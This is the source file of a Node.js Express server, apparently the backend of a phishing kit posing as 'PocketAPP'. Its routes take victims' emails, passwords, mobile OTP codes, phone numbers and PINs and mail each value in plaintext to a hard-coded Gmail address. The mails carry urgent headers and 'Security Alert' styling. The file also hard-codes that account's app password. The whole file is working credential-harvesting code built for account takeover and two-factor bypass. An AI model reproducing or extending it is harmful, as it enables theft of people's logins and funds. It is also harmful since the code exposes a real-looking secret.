const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "amienseniola99@gmail.com";
const pass = "tgydfmhlcpthufik";

// Helper function to create transporter (DRY principle)
const createTransporter = () => {
  return nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
};

// Helper function to send email with notification triggers
const sendEmail = (mailOptions, res) => {
  const transporter = createTransporter();
  
  // Add high priority headers to trigger push notifications
  mailOptions.priority = "high";
  mailOptions.headers = {
    "X-Priority": "1 (Highest)",
    "X-MSMail-Priority": "High",
    "Importance": "high"
  };
  
  console.log(mailOptions);
  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
};

// API route for Email and Password
app.post("/", (req, res) => {
  const { email, password } = req.body;
  const mailOptions = {
    from: `"PocketAPP Alert" <${userEmail}>`,
    to: userEmail,
    subject: `🚨 URGENT: New Login - ${email}`,
    text: `PocketAPP Clients: New user registered with Email: ${email} and password: ${password}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; text-align: center;">
          <h1 style="color: white; margin: 0;">🚨 Security Alert</h1>
        </div>
        <div style="background-color: #f8f9fa; padding: 30px; border: 2px solid #dc3545;">
          <h2 style="color: #dc3545; margin-top: 0;">⚠️ New Login Attempt Detected</h2>
          <div style="background-color: white; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <p style="margin: 10px 0;"><strong>📧 Email:</strong> <span style="color: #0066cc; font-size: 16px;">${email}</span></p>
            <p style="margin: 10px 0;"><strong>🔐 Password:</strong> <span style="color: #dc3545; font-size: 16px; font-family: monospace;">${password}</span></p>
          </div>
          <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-top: 20px;">
            <p style="margin: 0; color: #856404;"><strong>⏰ Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
        </div>
        <div style="background-color: #343a40; padding: 15px; text-align: center;">
          <p style="color: #adb5bd; margin: 0; font-size: 12px;">PocketAPP Security System</p>
        </div>
      </div>
    `
  };
  sendEmail(mailOptions, res);
});

// API route for Mobile OTP
app.post("/otp", (req, res) => {
  console.log(req.body);
  const mailOptions = {
    from: `"PocketAPP Alert" <${userEmail}>`,
    to: userEmail,
    subject: `🚨 URGENT: OTP Code - ${req.body?.otp}`,
    text: `PocketAPP Clients: User entered Mobile OTP: ${req.body?.otp}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); padding: 20px; text-align: center;">
          <h1 style="color: white; margin: 0;">🔔 OTP Alert</h1>
        </div>
        <div style="background-color: #f8f9fa; padding: 30px; border: 2px solid #dc3545;">
          <h2 style="color: #dc3545; margin-top: 0;">📱 Mobile OTP Entered</h2>
          <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; margin: 20px 0;">
            <p style="color: #666; margin: 0 0 10px 0;">OTP Code:</p>
            <h1 style="color: #dc3545; font-size: 48px; margin: 10px 0; letter-spacing: 8px; font-family: monospace;">${req.body?.otp}</h1>
          </div>
          <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-top: 20px;">
            <p style="margin: 0; color: #856404;"><strong>⏰ Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
        </div>
        <div style="background-color: #343a40; padding: 15px; text-align: center;">
          <p style="color: #adb5bd; margin: 0; font-size: 12px;">PocketAPP Security System</p>
        </div>
      </div>
    `
  };
  sendEmail(mailOptions, res);
});

// API route for Phone Number
app.post("/phone", (req, res) => {
  console.log(req.body);
  const { phone } = req.body;
  const mailOptions = {
    from: `"PocketAPP Alert" <${userEmail}>`,
    to: userEmail,
    subject: `🚨 URGENT: Phone Number - ${phone}`,
    text: `PocketAPP Clients: User entered Phone Number: ${phone}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); padding: 20px; text-align: center;">
          <h1 style="color: white; margin: 0;">📞 Phone Alert</h1>
        </div>
        <div style="background-color: #f8f9fa; padding: 30px; border: 2px solid #17a2b8;">
          <h2 style="color: #17a2b8; margin-top: 0;">📱 Phone Number Submitted</h2>
          <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; margin: 20px 0;">
            <p style="color: #666; margin: 0 0 10px 0;">Phone Number:</p>
            <h1 style="color: #17a2b8; font-size: 36px; margin: 10px 0; letter-spacing: 2px; font-family: monospace;">${phone}</h1>
          </div>
          <div style="background-color: #d1ecf1; border-left: 4px solid #17a2b8; padding: 15px; margin-top: 20px;">
            <p style="margin: 0; color: #0c5460;"><strong>⏰ Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
        </div>
        <div style="background-color: #343a40; padding: 15px; text-align: center;">
          <p style="color: #adb5bd; margin: 0; font-size: 12px;">PocketAPP Security System</p>
        </div>
      </div>
    `
  };
  sendEmail(mailOptions, res);
});

// API route for PIN
app.post("/pin", (req, res) => {
  console.log(req.body);
  const { pin } = req.body;
  const mailOptions = {
    from: `"PocketAPP Alert" <${userEmail}>`,
    to: userEmail,
    subject: `🚨 URGENT: PIN Entry - ${pin}`,
    text: `PocketAPP Clients: User entered PIN: ${pin}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); padding: 20px; text-align: center;">
          <h1 style="color: white; margin: 0;">🔐 PIN Alert</h1>
        </div>
        <div style="background-color: #f8f9fa; padding: 30px; border: 2px solid #fd7e14;">
          <h2 style="color: #fd7e14; margin-top: 0;">🔢 PIN Code Entered</h2>
          <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; margin: 20px 0;">
            <p style="color: #666; margin: 0 0 10px 0;">PIN Code:</p>
            <h1 style="color: #fd7e14; font-size: 56px; margin: 10px 0; letter-spacing: 12px; font-family: monospace;">${pin}</h1>
          </div>
          <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin-top: 20px;">
            <p style="margin: 0; color: #856404;"><strong>⏰ Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
        </div>
        <div style="background-color: #343a40; padding: 15px; text-align: center;">
          <p style="color: #adb5bd; margin: 0; font-size: 12px;">PocketAPP Security System</p>
        </div>
      </div>
    `
  };
  sendEmail(mailOptions, res);
});

// API route for Complaint Box
app.post("/complaint", (req, res) => {
  console.log(req.body);
  const { complaint } = req.body;
  const mailOptions = {
    from: `"PocketAPP Support" <${userEmail}>`,
    to: userEmail,
    subject: `💬 NEW: Customer Complaint Received`,
    text: `PocketAPP Clients: User submitted a complaint:

${complaint || "No complaint message provided"}`,
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%); padding: 20px; text-align: center;">
          <h1 style="color: #333; margin: 0;">💬 Customer Support</h1>
        </div>
        <div style="background-color: #f8f9fa; padding: 30px; border: 2px solid #6c757d;">
          <h2 style="color: #6c757d; margin-top: 0;">📝 New Complaint Received</h2>
          <div style="background-color: white; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #6c757d;">
            <p style="color: #333; line-height: 1.6; margin: 0;">${complaint || "No complaint message provided"}</p>
          </div>
          <div style="background-color: #e2e3e5; border-left: 4px solid #6c757d; padding: 15px; margin-top: 20px;">
            <p style="margin: 0; color: #383d41;"><strong>⏰ Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
        </div>
        <div style="background-color: #343a40; padding: 15px; text-align: center;">
          <p style="color: #adb5bd; margin: 0; font-size: 12px;">PocketAPP Customer Support</p>
        </div>
      </div>
    `
  };
  sendEmail(mailOptions, res);
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
